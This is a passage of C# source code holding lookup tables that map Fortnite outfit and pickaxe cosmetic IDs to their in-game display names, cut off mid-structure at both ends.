  "splatterella"
},
{
  "cid_833_athena_commando_f_triplescoop",
  "derbydynamo"
},
{
  "cid_834_athena_commando_m_axl",
  "axo"
},
{
  "cid_835_athena_commando_f_ladyatlantis",
  "bryne"
},
{
  "cid_836_athena_commando_m_jonesyflare",
  "castawayjonesy"
},
{
  "cid_837_athena_commando_m_maskeddancer",
  "seeker"
},
{
  "cid_838_athena_commando_m_junksamurai",
  "samuraiscrapper"
},
{
  "cid_839_athena_commando_f_hightowersquash",
  "storm"
},
{
  "cid_840_athena_commando_m_hightowergrape",
  "groot"
},
{
  "cid_841_athena_commando_m_hightowerwasabi",
  "wolverine"
},
{
  "cid_842_athena_commando_f_hightowerhoneydew",
  "jenniferwalters"
},
{
  "cid_843_athena_commando_m_hightowertomato_casual",
  "tonystark"
},
{
  "cid_844_athena_commando_f_hightowermango",
  "mystique"
},
{
  "cid_845_athena_commando_m_hightowertapas",
  "thor"
},
{
  "cid_846_athena_commando_m_hightowerdate",
  "doctordoom"
},
{
  "cid_847_athena_commando_m_soy_2as3c",
  "silversurfer"
},
{
  "cid_848_athena_commando_f_darkninjapurple",
  "dreadfate"
},
{
  "cid_849_athena_commando_m_darkeaglepurple",
  "dreadomen"
},
{
  "cid_850_athena_commando_f_skullbritecube",
  "darkskully"
},
{
  "cid_851_athena_commando_m_bittenhead",
  "tarttycoon"
},
{
  "cid_852_athena_commando_f_blackwidowcorrupt",
  "corruptedarachne"
},
{
  "cid_853_athena_commando_f_sniperhoodcorrupt",
  "corruptedinsight"
},
{
  "cid_854_athena_commando_m_samuraiultraarmorcorrupt",
  "corruptedshogun"
},
{
  "cid_855_athena_commando_m_elastic",
  "hunter"
},
{
  "cid_856_athena_commando_m_elastic_b",
  "hypersonic"
},
{
  "cid_857_athena_commando_m_elastic_c",
  "blastoff"
},
{
  "cid_858_athena_commando_m_elastic_d",
  "wanderlust"
},
{
  "cid_859_athena_commando_m_elastic_e",
  "themightyvolt"
},
{
  "cid_860_athena_commando_f_elastic",
  "dynamodancer"
},
{
  "cid_861_athena_commando_f_elastic_b",
  "backlash"
},
{
  "cid_862_athena_commando_f_elastic_c",
  "firebrand"
},
{
  "cid_863_athena_commando_f_elastic_d",
  "polarity"
},
{
  "cid_864_athena_commando_f_elastic_e",
  "joltara"
},
{
  "cid_866_athena_commando_f_myth",
  "antheia"
},
{
  "cid_867_athena_commando_m_myth",
  "morro"
},
{
  "cid_868_athena_commando_m_backspin_3u6ca",
  "blade"
},
{
  "cid_869_athena_commando_f_cavalry",
  "victoriasaint"
},
{
  "cid_871_athena_commando_f_streetfashiongarnet",
  "sagan"
},
{
  "cid_873_athena_commando_m_rebirthdefaulte",
  "newdefault9"
},
{
  "cid_874_athena_commando_m_rebirthdefaultf",
  "newdefault10"
},
{
  "cid_875_athena_commando_m_rebirthdefaultg",
  "newdefault11"
},
{
  "cid_876_athena_commando_m_rebirthdefaulth",
  "newdefault12"
},
{
  "cid_877_athena_commando_m_rebirthdefaulti",
  "newdefault13"
},
{
  "cid_878_athena_commando_f_rebirthdefault_e",
  "newdefaut14"
},
{
  "cid_879_athena_commando_f_rebirthdefault_f",
  "newdefault15"
},
{
  "cid_880_athena_commando_f_rebirthdefault_g",
  "newdefault16"
},
{
  "cid_881_athena_commando_f_rebirthdefault_h",
  "newdefault17"
},
{
  "cid_882_athena_commando_f_rebirthdefault_i",
  "newdefault18"
},
{
  "cid_883_athena_commando_m_chonejonesy",
  "jonesythefirst"
},
{
  "cid_884_athena_commando_f_choneramirez",
  "vintageramirez"
},
{
  "cid_885_athena_commando_m_chonehawk",
  "hawkclassic"
},
{
  "cid_886_athena_commando_m_chonerenegade",
  "originalrenegade"
},
{
  "cid_887_athena_commando_m_chonespitfire",
  "rookiespitfire"
},
{
  "cid_888_athena_commando_f_chonebanshee",
  "vanguardbanshee"
},
{
  "cid_889_athena_commando_f_chonewildcat",
  "wildstreakone"
},
{
  "cid_890_athena_commando_f_choneheadhunter",
  "headhunter"
},
{
  "cid_891_athena_commando_m_lunchbox",
  "lachlan"
},
{
  "cid_892_athena_commando_f_vampirecasual",
  "midnightdusk"
},
{
  "cid_893_athena_commando_f_blackwidowjacket",
  "arachnecouture"
},
{
  "cid_894_athena_commando_m_palespooky",
  "gnash"
},
{
  "cid_895_athena_commando_m_delisandwich",
  "daredevil"
},
{
  "cid_896_athena_commando_f_spookyneon",
  "violet"
},
{
  "cid_897_athena_commando_f_darkbombersummer",
  "nightsurfbomber"
},
{
  "cid_898_commando_m_flowerskeleton",
  "grave"
},
{
  "cid_899_athena_commando_f_poison",
  "grimoire"
},
{
  "cid_900_athena_commando_m_famine",
  "headlock"
},
{
  "cid_901_athena_commando_f_pumpkinspice",
  "patch"
},
{
  "cid_902_athena_commando_m_pumpkinpunk",
  "punk"
},
{
  "cid_903_athena_commando_f_frankie",
  "ravina"
},
{
  "cid_904_athena_commando_m_jekyll",
  "thegooddoctor"
},
{
  "cid_905_athena_commando_m_york",
  "p.k.e.ranger"
},
{
  "cid_906_athena_commando_m_york_b",
  "containmentspecialist"
},
{
  "cid_907_athena_commando_m_york_c",
  "ectoexpert"
},
{
  "cid_908_athena_commando_m_york_d",
  "hauntofficer"
},
{
  "cid_909_athena_commando_m_york_e",
  "paranormalguide"
},
{
  "cid_910_athena_commando_f_york",
  "auraanalyzer"
},
{
  "cid_911_athena_commando_f_york_b",
  "specterinspector"
},
{
  "cid_912_athena_commando_f_york_c",
  "phantomcommando"
},
{
  "cid_913_athena_commando_f_york_d",
  "cursebuster"
},
{
  "cid_914_athena_commando_f_york_e",
  "spiritsniper"
},
{
  "cid_915_athena_commando_f_ravenquillskull",
  "boneravage"
},
{
  "cid_916_athena_commando_f_fuzzybearskull",
  "skullsquadleader"
},
{
  "cid_917_athena_commando_m_durrburgerskull",
  "boneboss"
},
{
  "cid_918_athena_commando_m_teriyakifishskull",
  "fishskull"
},
{
  "cid_919_athena_commando_f_babayaga",
  "babayaga"
},
{
  "cid_920_athena_commando_m_partytrooper",
  "partytrooper"
},
{
  "cid_921_athena_commando_f_parcelpetal",
  "poisonivy"
},
{
  "cid_922_athena_commando_m_parcelprank",
  "thejoker"
},
{
  "cid_923_athena_commando_m_parcelgold",
  "midasrex"
},
{
  "cid_924_athena_commando_m_embers",
  "ghostrider"
},
{
  "cid_925_athena_commando_f_tapdance",
  "blackwidow(snowsuit)"
},
{
  "cid_926_athena_commando_f_streetfashiondiamond",
  "cloudstriker"
},
{
  "cid_927_athena_commando_m_nauticalpajamas",
  "remraider"
},
{
  "cid_928_athena_commando_m_nauticalpajamas_b",
  "napcap'n"
},
{
  "cid_929_athena_commando_m_nauticalpajamas_c",
  "sgt.snooze"
},
{
  "cid_930_athena_commando_m_nauticalpajamas_d",
  "dozer"
},
{
  "cid_931_athena_commando_m_nauticalpajamas_e",
  "slumberjack"
},
{
  "cid_932_athena_commando_m_shockwave",
  "powerhouse"
},
{
  "cid_933_athena_commando_f_futurepink",
  "backscatter"
},
{
  "cid_934_athena_commando_m_vertigo",
  "venom"
},
{
  "cid_935_athena_commando_f_eternity",
  "galaxia"
},
{
  "cid_936_athena_commando_f_raidersilver",
  "diamonddiva"
},
{
  "cid_937_athena_commando_m_football20_uic2q",
  "passrushranger"
},
{
  "cid_938_athena_commando_m_football20_b_i18w6",
  "scrimmagescrapper"
},
{
  "cid_939_athena_commando_m_football20_c_9op0f",
  "blitzbrigade"
},
{
  "cid_940_athena_commando_m_football20_d_zid7q",
  "redzonerenegade"
},
{
  "cid_941_athena_commando_m_football20_e_knwuy",
  "tdtitan"
},
{
  "cid_942_athena_commando_f_football20_yqupk",
  "formationfighter"
},
{
  "cid_943_athena_commando_f_football20_b_gr3wn",
  "puntparagon"
},
{
  "cid_944_athena_commando_f_football20_c_fo6iy",
  "crossbarcrusher"
},
{
  "cid_945_athena_commando_f_football20_d_g1uyt",
  "snapsquad"
},
{
  "cid_946_athena_commando_f_football20_e_efkp3",
  "trenchrunner"
},
{
  "cid_947_athena_commando_m_football20referee_in7ey",
  "fairplay"
},
{
  "cid_948_athena_commando_m_football20referee_b_qpxth",
  "sidelinecommander"
},
{
  "cid_949_athena_commando_m_football20referee_c_smmey",
  "offsideofficer"
},
{
  "cid_950_athena_commando_m_football20referee_d_mihme",
  "time-out"
},
{
  "cid_951_athena_commando_m_football20referee_e_qbiba",
  "elitelinesman"
},
{
  "cid_952_athena_commando_f_football20referee_zx4ic",
  "huddlehero"
},
{
  "cid_953_athena_commando_f_football20referee_b_5sv7q",
  "endzoneexpert"
},
{
  "cid_954_athena_commando_f_football20referee_c_naq0g",
  "spiralspecialist"
},
{
  "cid_955_athena_commando_f_football20referee_d_ofzil",
  "offenseoverseer"
},
{
  "cid_956_athena_commando_f_football20referee_e_dqtp6",
  "replayranger"
},
{
  "cid_957_athena_commando_f_ponytail",
  "heart-stopper"
},
{
  "cid_958_athena_commando_m_pieman",
  "mincemeat"
},
{
  "cid_959_athena_commando_m_corny",
  "cobb"
},
{
  "cid_960_athena_commando_m_cosmos",
  "mandalorian"
},
{
  "cid_961_athena_commando_f_shapeshifter",
  "mave"
},
{
  "cid_962_athena_commando_m_flapjackwrangler",
  "mancake"
},
{
  "cid_963_athena_commando_f_lexa",
  "lexa"
},
{
  "cid_964_athena_commando_m_historian_869bc",
  "kratos"
},
{
  "cid_965_athena_commando_f_spacefighter",
  "reese"
},
{
  "cid_966_athena_commando_m_futuresamurai",
  "kondor"
},
{
  "cid_967_athena_commando_m_ancientgladiator",
  "menace"
},
{
  "cid_968_athena_commando_m_teriyakifishelf",
  "fa-la-la-la-fishstick"
},
{
  "cid_969_athena_commando_m_snowmanfashion",
  "snowmando"
},
{
  "cid_970_athena_commando_f_renegaderaiderholiday",
  "gingerbreadraider"
},
{
  "cid_971_athena_commando_m_jupiter_s0z6m",
  "masterchief"
},
{
  "cid_972_athena_commando_f_arcticcamowoods",
  "frostsquad"
},
{
  "cid_973_athena_commando_f_mechstructor",
  "machinistmina"
},
{
  "cid_974_athena_commando_f_streetfashionholiday",
  "hollystriker"
},
{
  "cid_975_athena_commando_f_cherry_b8xn5",
  "captainmarvel"
},
{
  "cid_976_athena_commando_f_wombat_0grtq",
  "michonne"
},
{
  "cid_977_athena_commando_m_wombat_r7q8k",
  "daryldixon"
},
{
  "cid_978_athena_commando_m_fancycandy",
  "mr.dappermint"
},
{
  "cid_979_athena_commando_m_snowboarder",
  "karve"
},
{
  "cid_980_athena_commando_f_elf",
  "snowbell"
},
{
  "cid_981_athena_commando_m_jonesyholiday",
  "cozyjonesy"
},
{
  "cid_982_athena_commando_m_driftwinter",
  "snowdrift"
},
{
  "cid_983_athena_commando_f_cupidwinter",
  "snowheart"
},
{
  "cid_984_athena_commando_m_holidaylights",
  "blinky "
},
{
  "cid_985_athena_commando_m_tiptoe_5l424",
  "green arrow "
},
{
  "cid_986_athena_commando_m_plumretro_4aja2",
  "black panther "
},
{
  "cid_987_athena_commando_m_frostbyte",
  "frost broker "
},
{
  "cid_988_athena_commando_m_tiramisu_5khzp",
  "taskmaster "
},
{
  "cid_990_athena_commando_m_grilledcheese_snx4k",
  "thegrefg "
},
{
  "cid_991_athena_commando_m_nightmare_nm1c8",
  "predator "
},
{
  "cid_992_athena_commando_f_typhoon_lpfu6",
  "sarah connor "
},
{
  "cid_993_athena_commando_m_typhoonrobot_2yrgv",
  "t-800 "
},
{
  "cid_994_athena_commando_m_lexa",
  "orin "
},
{
  "cid_995_athena_commando_m_globalfb_h5oij",
  "midfield master "
},
{
  "cid_996_athena_commando_m_globalfb_b_rved4",
  "sgt. sweeper "
},
{
  "cid_997_athena_commando_m_globalfb_c_n6i4h",
  "galactico "
},
{
  "cid_998_athena_commando_m_globalfb_d_utib8",
  "power poacher "
},
{
  "cid_999_athena_commando_m_globalfb_e_oisu6",
  "breakaway "
},
{
  "cid_a_001_athena_commando_f_globalfb_hdl2w",
  "striker specialist "
},
{
  "cid_a_002_athena_commando_f_globalfb_b_0ch64",
  "shot stopper "
},
{
  "cid_a_003_athena_commando_f_globalfb_c_j4h5j",
  "derby dominator "
},
{
  "cid_a_004_athena_commando_f_globalfb_d_62oz5",
  "tiki tackler "
},
{
  "cid_a_005_athena_commando_f_globalfb_e_gth5i",
  "pitch patroller "
},
{
  "cid_a_006_athena_commando_m_convoytarantula_641pz",
  "snake eyes "
},
{
  "cid_a_007_athena_commando_f_streetfashioneclipse",
  "ruby shadows "
},
{
  "cid_a_008_athena_commando_f_combatdoll",
  "tess "
},
{
  "cid_a_009_athena_commando_f_foxwarrior_21b9r",
  "vi "
},
{
  "cid_a_011_athena_commando_m_streetcuddles",
  "cuddle king "
},
{
  "cid_a_022_athena_commando_f_crush",
  "lovely "
},

		};
		public static Hashtable Pickaxes = new Hashtable
		{
			{
  "boltonpickaxe",
  "close shave"
},
{
  "defaultpickaxe",
  "default pickaxe"
},
{
  "dev_test_pickaxe",
  "test pickaxe"
},
{
  "halloweenscythe",
  "reaper"
},
{
  "happypickaxe",
  "lucky"
},
{
  "pickaxe_deathvalley",
  "death valley"
},
{
  "pickaxe_flamingo",
  "pink flamingo"
},
{
  "pickaxe_id_011_medieval",
  "axecalibur"
},
{
  "pickaxe_id_012_district",
  "pulse axe"
},
{
  "pickaxe_id_013_teslacoil",
  "ac/dc"
},
{
  "pickaxe_id_014_wintercamo",
  "ice breaker"
},
{
  "pickaxe_id_015_holidaycandycane",
  "candy axe"
},
{
  "pickaxe_id_016_disco",
  "disco brawl"
},
{
  "pickaxe_id_017_shark",
  "chomp jr."
},
{
  "pickaxe_id_018_anchor",
  "bottom feeder"
},
{
  "pickaxe_id_019_heart",
  "tat axe"
},
{
  "pickaxe_id_020_keg",
  "party animal"
},
{
  "pickaxe_id_021_megalodon",
  "tooth pick"
},
{
  "pickaxe_id_022_holidaygiftwrap",
  "you shouldn't have!"
},
{
  "pickaxe_id_023_skiboot",
  "ski boot"
},
{
  "pickaxe_id_024_plunger",
  "plunja"
},
{
  "pickaxe_id_025_dragon",
  "dragon axe"
},
{
  "pickaxe_id_026_brite",
  "rainbow smash"
},
{
  "pickaxe_id_027_scavenger",
  "sawtooth"
},
{
  "pickaxe_id_028_space",
  "eva"
},
{
  "pickaxe_id_029_assassin",
  "trusty no. 2"
},
{
  "pickaxe_id_030_artdeco",
  "empire axe"
},
{
  "pickaxe_id_031_squeak",
  "pick squeak"
},
{
  "pickaxe_id_032_tactical",
  "tactical spade"
},
{
  "pickaxe_id_033_potofgold",
  "pot o' gold"
},
{
  "pickaxe_id_034_rockerpunk",
  "anarchy axe"
},
{
  "pickaxe_id_035_prismatic",
  "spectral axe"
},
{
  "pickaxe_id_036_cuchulainn",
  "silver fang"
},
{
  "pickaxe_id_037_stealth",
  "spectre"
},
{
  "pickaxe_id_038_carrot",
  "carrot stick"
},
{
  "pickaxe_id_039_tacticalblack",
  "instigator"
},
{
  "pickaxe_id_040_pizza",
  "axeroni"
},
{
  "pickaxe_id_041_pajamaparty",
  "bitemark"
},
{
  "pickaxe_id_042_circuitbreaker",
  "cutting edge"
},
{
  "pickaxe_id_043_orbitingplanets",
  "global axe"
},
{
  "pickaxe_id_044_tacticalurbanhammer",
  "tenderizer"
},
{
  "pickaxe_id_045_valor",
  "gale force"
},
{
  "pickaxe_id_046_candy",
  "lollipopper"
},
{
  "pickaxe_id_047_carbideblue",
  "positron"
},
{
  "pickaxe_id_048_carbideblack",
  "onslaught"
},
{
  "pickaxe_id_049_metal",
  "persuader"
},
{
  "pickaxe_id_050_graffiti",
  "renegade roller"
},
{
  "pickaxe_id_051_neonglow",
  "glow stick"
},
{
  "pickaxe_id_052_hazmat",
  "autocleave"
},
{
  "pickaxe_id_053_deco",
  "airfoil"
},
{
  "pickaxe_id_054_filmcamera",
  "director's cut"
},
{
  "pickaxe_id_055_stop",
  "stop axe"
},
{
  "pickaxe_id_056_venus",
  "tendril"
},
{
  "pickaxe_id_057_jailbird",
  "nite owl"
},
{
  "pickaxe_id_058_basketball",
  "slam dunk"
},
{
  "pickaxe_id_059_darkeagle",
  "oracle axe"
},
{
  "pickaxe_id_060_darkninja",
  "fated frame"
},
{
  "pickaxe_id_061_wwiipilot",
  "propeller axe"
},
{
  "pickaxe_id_062_soccer",
  "elite cleat"
},
{
  "pickaxe_id_063_vuvuzela",
  "vuvuzela"
},
{
  "pickaxe_id_064_gumshoe",
  "magnifying axe"
},
{
  "pickaxe_id_065_speedyred",
  "razor edge"
},
{
  "pickaxe_id_066_flintlockred",
  "crimson axe"
},
{
  "pickaxe_id_067_taxi",
  "victory lap"
},
{
  "pickaxe_id_068_drift",
  "rift edge"
},
{
  "pickaxe_id_069_darkviking",
  "permafrost"
},
{
  "pickaxe_id_070_viking",
  "forebearer"
},
{
  "pickaxe_id_071_streetracer",
  "lug axe"
},
{
  "pickaxe_id_072_luchador",
  "piledriver"
},
{
  "pickaxe_id_073_balloon",
  "balloon axe"
},
{
  "pickaxe_id_074_sharpdresser",
  "studded axe"
},
{
  "pickaxe_id_075_huya",
  "pointer"
},
{
  "pickaxe_id_076_douyu",
  "power grip"
},
{
  "pickaxe_id_077_carbidewhite",
  "resonator"
},
{
  "pickaxe_id_078_lifeguard",
  "rescue paddle"
},
{
  "pickaxe_id_079_modernmilitary",
  "caliper"
},
{
  "pickaxe_id_080_scuba",
  "harpoon axe"
},
{
  "pickaxe_id_081_streetracercobra",
  "clutch axe"
},
{
  "pickaxe_id_082_sushichef",
  "filet axe"
},
{
  "pickaxe_id_083_exercise",
  "axercise"
},
{
  "pickaxe_id_084_durrburgerhero",
  "patty whacker"
},
{
  "pickaxe_id_085_wukong",
  "jingu bang"
},
{
  "pickaxe_id_086_biker",
  "throttle"
},
{
  "pickaxe_id_087_hippie",
  "drumbeat"
},
{
  "pickaxe_id_088_psburnout",
  "controller"
},
{
  "pickaxe_id_089_ravenquill",
  "iron beak"
},
{
  "pickaxe_id_090_samuraiblue",
  "cat's claw"
},
{
  "pickaxe_id_091_hacivat",
  "tree splitter"
},
{
  "pickaxe_id_092_bling",
  "crowbar"
},
{
  "pickaxe_id_093_medic",
  "flatliner"
},
{
  "pickaxe_id_094_football",
  "upright axe"
},
{
  "pickaxe_id_095_footballtrophy",
  "golden pigskin"
},
{
  "pickaxe_id_096_footballreferee",
  "first downer"
},
{
  "pickaxe_id_097_raptorarcticcamo",
  "chill-axe"
},
{
  "pickaxe_id_098_garageband",
  "lead swinger"
},
{
  "pickaxe_id_099_modernmilitaryred",
  "pinpoint"
},
{
  "pickaxe_id_100_dieselpunk",
  "turbine"
},
{
  "pickaxe_id_101_octoberfest",
  "axcordion"
},
{
  "pickaxe_id_102_redriding",
  "guiding glow"
},
{
  "pickaxe_id_103_fortnitedj",
  "smash up"
},
{
  "pickaxe_id_104_cowgirl",
  "reckoning"
},
{
  "pickaxe_id_105_scarecrow",
  "harvester"
},
{
  "pickaxe_id_106_darkbomber",
  "thunder crash"
},
{
  "pickaxe_id_107_halloweentomato",
  "night slicer"
},
{
  "pickaxe_id_107_plague",
  "herald's wand"
},
{
  "pickaxe_id_108_pumpkinslice",
  "carver"
},
{
  "pickaxe_id_109_skulltrooper",
  "skull sickle"
},
{
  "pickaxe_id_110_vampire",
  "moonrise"
},
{
  "pickaxe_id_111_blackwidow",
  "web breaker"
},
{
  "pickaxe_id_112_guanyu",
  "guandao"
},
{
  "pickaxe_id_113_muertos",
  "six string striker"
},
{
  "pickaxe_id_114_badasscowboycowskull",
  "longhorn"
},
{
  "pickaxe_id_115_evilcowboy",
  "dark shard"
},
{
  "pickaxe_id_116_celestial",
  "stellar axe"
},
{
  "pickaxe_id_117_madcommander",
  "splinterstrike"
},
{
  "pickaxe_id_118_streetops",
  "angular axe"
},
{
  "pickaxe_id_119_animaljackets",
  "jackspammer"
},
{
  "pickaxe_id_120_samuraiultraarmor",
  "jawblade"
},
{
  "pickaxe_id_121_robotred",
  "a.x.e."
},
{
  "pickaxe_id_122_witch",
  "spellslinger"
},
{
  "pickaxe_id_123_hornedmask",
  "gatekeeper"
},
{
  "pickaxe_id_124_feathers",
  "scrambler"
},
{
  "pickaxe_id_125_moth",
  "lamp"
},
{
  "pickaxe_id_126_yeti",
  "abominable axe"
},
{
  "pickaxe_id_127_rhino",
  "mauler"
},
{
  "pickaxe_id_131_nautilus",
  "krakenaxe"
},
{
  "pickaxe_id_131_neoncat",
  "scratchmark"
},
{
  "pickaxe_id_132_arcticsniper",
  "scorcher"
},
{
  "pickaxe_id_133_demon",
  "evil eye"
},
{
  "pickaxe_id_133_iceking",
  "ice scepter"
},
{
  "pickaxe_id_134_snowman",
  "icicle"
},
{
  "pickaxe_id_135_snowninja",
  "inverted blade"
},
{
  "pickaxe_id_136_math",
  "t-square"
},
{
  "pickaxe_id_137_nutcracker",
  "snow globe"
},
{
  "pickaxe_id_138_gnome",
  "cold snap"
},
{
  "pickaxe_id_139_gingerbread",
  "cookie cutter"
},
{
  "pickaxe_id_140_streetgoth",
  "vision"
},
{
  "pickaxe_id_141_krampus",
  "brat catcher"
},
{
  "pickaxe_id_142_teriyakifish",
  "bootstraps"
},
{
  "pickaxe_id_143_flintlockwinter",
  "frozen axe"
},
{
  "pickaxe_id_144_angel",
  "virtue"
},
{
  "pickaxe_id_145_icemaiden",
  "flurry"
},
{
  "pickaxe_id_146_militaryfashion",
  "clean cut"
},
{
  "pickaxe_id_147_techops",
  "armature"
},
{
  "pickaxe_id_148_barbarian",
  "battle axe"
},
{
  "pickaxe_id_149_wavyman",
  "flimsie flail"
},
{
  "pickaxe_id_150_icequeen",
  "icebringer"
},
{
  "pickaxe_id_151_alienfishhead",
  "squid striker"
},
{
  "pickaxe_id_152_dragonmask",
  "outburst"
},
{
  "pickaxe_id_153_roseleader",
  "rose glow"
},
{
  "pickaxe_id_154_squishy",
  "marshy smasher"
},
{
  "pickaxe_id_155_valentinesfrozen",
  "cold hearted"
},
{
  "pickaxe_id_156_ravenquillfrozen",
  "frozen beak"
},
{
  "pickaxe_id_157_dumpling",
  "souped up"
},
{
  "pickaxe_id_158_fuzzybear",
  "cuddle paw"
},
{
  "pickaxe_id_159_robottrouble",
  "crossroads"
},
{
  "pickaxe_id_160_icecream",
  "ice pop"
},
{
  "pickaxe_id_161_lovellama",
  "chocollama"
},
{
  "pickaxe_id_162_skullbrite",
  "skully splitter"
},
{
  "pickaxe_id_163_pirateoctopus",
  "swag smasher"
},
{
  "pickaxe_id_164_dragonninja",
  "dragon's claw"
},
{
  "pickaxe_id_165_masterkey",
  "lockpick"
},
{
  "pickaxe_id_166_shiny",
  "flawless"
},
{
  "pickaxe_id_167_medusa",
  "snakebite"
},
{
  "pickaxe_id_168_bandolier",
  "machete"
},
{
  "pickaxe_id_169_farmer",
  "gold digger"
},
{
  "pickaxe_id_170_aztec",
  "axetec"
},
{
  "pickaxe_id_171_orangecamo",
  "brute force"
},
{
  "pickaxe_id_172_bandageninja",
  "quickstrike"
},
{
  "pickaxe_id_173_sciops",
  "psionic edge"
},
{
  "pickaxe_id_174_luckyrider",
  "emerald smasher"
},
{
  "pickaxe_id_175_tropical",
  "fresh cut"
},
{
  "pickaxe_id_176_devilrock",
  "burning axe"
},
{
  "pickaxe_id_177_evilsuit",
  "crimson scythe"
},
{
  "pickaxe_id_178_speedymidnight",
  "dark razor"
},
{
  "pickaxe_id_179_starwand",
  "star wand"
},
{
  "pickaxe_id_180_tristar",
  "tri-star"
},
{
  "pickaxe_id_181_log",
  "stumpy"
},
{
  "pickaxe_id_182_piratewheel",
  "high seas"
},
{
  "pickaxe_id_183_baseballbat2018",
  "grand slammer"
},
{
  "pickaxe_id_184_darkshaman",
  "moonbone"
},
{
  "pickaxe_id_185_badasscowboycactus",
  "prickly axe"
},
{
  "pickaxe_id_186_demonstone",
  "demon skull"
},
{
  "pickaxe_id_187_furnaceface",
  "dread"
},
{
  "pickaxe_id_188_streetassassin",
  "red streak"
},
{
  "pickaxe_id_189_streetopsstealth",
  "stealth angular axe"
},
{
  "pickaxe_id_190_golfclub",
  "driver"
},
{
  "pickaxe_id_191_banana",
  "peely pick"
},
{
  "pickaxe_id_192_palmtree",
  "relax axe"
},
{
  "pickaxe_id_193_hotdog",
  "knockwurst"
},
{
  "pickaxe_id_194_thebomb",
  "shrapnel"
},
{
  "pickaxe_id_195_spacebunny",
  "plasma carrot"
},
{
  "pickaxe_id_196_evilbunny",
  "steel carrot"
},
{
  "pickaxe_id_197_hoppityheist",
  "bold bar"
},
{
  "pickaxe_id_198_bountybunny",
  "sprout"
},
{
  "pickaxe_id_199_shinyhammer",
  "silver sledge"
},
{
  "pickaxe_id_200_moonlightassassin",
  "astral axe"
},
{
  "pickaxe_id_201_swashbuckler",
  "flint striker"
},
{
  "pickaxe_id_202_ashtonboardwalk",
  "widow’s bite"
},
{
  "pickaxe_id_203_ashtonsaltlake",
  "guardian axe"
},
{
  "pickaxe_id_204_miner",
  "rockbreaker "
},
{
  "pickaxe_id_205_strawberrypilot",
  "vox"
},
{
  "pickaxe_id_206_strawberrypilot_1h",
  "harmonic axes"
},
{
  "pickaxe_id_207_bountyhunter",
  "revoker"
},
{
  "pickaxe_id_208_masako",
  "scarlet scythe"
},
{
  "pickaxe_id_209_battlesuit",
  "mech axe"
},
{
  "pickaxe_id_210_bunkerman",
  "bunker basher"
},
{
  "pickaxe_id_211_bunkerman_1h",
  "ripe rippers"
},
{
  "pickaxe_id_212_cyberscavenger",
  "web wrecker"
},
{
  "pickaxe_id_213_assassinsuitsledgehammer",
  "simple sledge"
},
{
  "pickaxe_id_214_geisha",
  "shamisen"
},
{
  "pickaxe_id_215_pug",
  "chew toy"
},
{
  "pickaxe_id_216_demonhunter1h",
  "foul play"
},
{
  "pickaxe_id_217_urbanscavenger1h",
  "metro machetes"
},
{
  "pickaxe_id_218_stormsoldier",
  "storm bolt"
},
{
  "pickaxe_id_219_bandageninja1h",
  "talons"
},
{
  "pickaxe_id_220_forkknife1h",
  "fork knife"
},
{
  "pickaxe_id_221_skullbriteeclipse",
  "stark splitter"
},
{
  "pickaxe_id_222_banner",
  "emblematic"
},
{
  "pickaxe_id_223_jellyfish",
  "conch cleaver"
},
{
  "pickaxe_id_224_butterfly",
  "shard sickle"
},
{
  "pickaxe_id_225_caterpillar",
  "flycatcher"
},
{
  "pickaxe_id_226_cyberfublade",
  "fixation"
},
{
  "pickaxe_id_227_femaleglowbro",
  "splintered light"
},
{
  "pickaxe_id_228_maleglowbro",
  "vivid axe"
},
{
  "pickaxe_id_229_techmage",
  "wild tangent"
},
{
  "pickaxe_id_230_drift1h",
  "dual edge"
},
{
  "pickaxe_id_231_flamingo2",
  "lawnbreaker"
},
{
  "pickaxe_id_232_grillin1h",
  "low 'n slow"
},
{
  "pickaxe_id_233_birthday2019",
  "birthday slice"
},
{
  "pickaxe_id_234_cyberkarate",
  "power punch"
},
{
  "pickaxe_id_235_lasagna",
  "lazer axe"
},
{
  "pickaxe_id_236_multibot1h",
  "combo cleavers"
},
{
  "pickaxe_id_237_warpaint",
  "mean streak "
},
{
  "pickaxe_id_238_bubblegum",
  "bubble popper"
},
{
  "pickaxe_id_239_pizzapitpj1h",
  "pair-peronni"
},
{
  "pickaxe_id_240_graffitiremix1h",
  "renegade rollers"
},
{
  "pickaxe_id_241_knightremix",
  "vanquisher"
},
{
  "pickaxe_id_242_sparkleremix",
  "sparkle scythe"
},
{
  "pickaxe_id_243_djremix",
  "sc3pt3r"
},
{
  "pickaxe_id_244_rustremix1h",
  "fang saws"
},
{
  "pickaxe_id_245_voyagerremix1h",
  "cosmic cleavers"
},
{
  "pickaxe_id_246_bluebadass1h",
  "tac bats"
},
{
  "pickaxe_id_247_bonewasp",
  "primal sting"
},
{
  "pickaxe_id_248_mechpilot",
  "robo wrecker"
},
{
  "pickaxe_id_249_squishy1h",
  "mello mallets"
},
{
  "pickaxe_id_250_lopex",
  "spikeclone"
},
{
  "pickaxe_id_251_mascotmilitiaburger",
  "grillcount"
},
{
  "pickaxe_id_252_mascotmilitiatomato",
  "rusty roller"
},
{
  "pickaxe_id_253_starwalker",
  "star strike"
},
{
  "pickaxe_id_254_syko",
  "plasmatic edge"
},
{
  "pickaxe_id_255_wisemaster",
  "wisdom's edge"
},
{
  "pickaxe_id_256_techopsblue",
  "pneumatic twin"
},
{
  "pickaxe_id_257_frostmystery1h",
  "hyper edge"
},
{
  "pickaxe_id_258_rockerpunkcube1h",
  "dark strikers"
},
{
  "pickaxe_id_259_cupidfemale1h",
  "cupid's daggers"
},
{
  "pickaxe_id_260_angeleclipse1h",
  "shadow strikers"
},
{
  "pickaxe_id_261_darkeaglefire1h",
  "molten strikers"
},
{
  "pickaxe_id_262_futurebikerwhite",
  "chained cleaver"
},
{
  "pickaxe_id_263_jonesycube",
  "dark axe"
},
{
  "pickaxe_id_264_lemonlime1h",
  "sour strikers"
},
{
  "pickaxe_id_265_barbequelarry1h",
  "psycho buzz axes"
},
{
  "pickaxe_id_266_paddedarmor",
  "impact edge"
},
{
  "pickaxe_id_267_raptorblackops",
  "blue bolt"
},
{
  "pickaxe_id_268_toxickitty1h",
  "jagged edge"
},
{
  "pickaxe_id_269_wwiipilotscifi",
  "aero axe"
},
{
  "pickaxe_id_270_jumpstart",
  "megavolt"
},
{
  "pickaxe_id_271_punchy",
  "clobber axe"
},
{
  "pickaxe_id_272_sleepytime",
  "nighty night"
},
{
  "pickaxe_id_273_streetfashionred",
  "stripe slicer"
},
{
  "pickaxe_id_274_streeturchin",
  "ave axe"
},
{
  "pickaxe_id_275_traveler",
  "flying slasher"
},
{
  "pickaxe_id_276_blackmondayfemale1h_1v4he",
  "cat's claws"
},
{
  "pickaxe_id_277_blackmondaymale_5tlsd",
  "batman pickaxe"
},
{
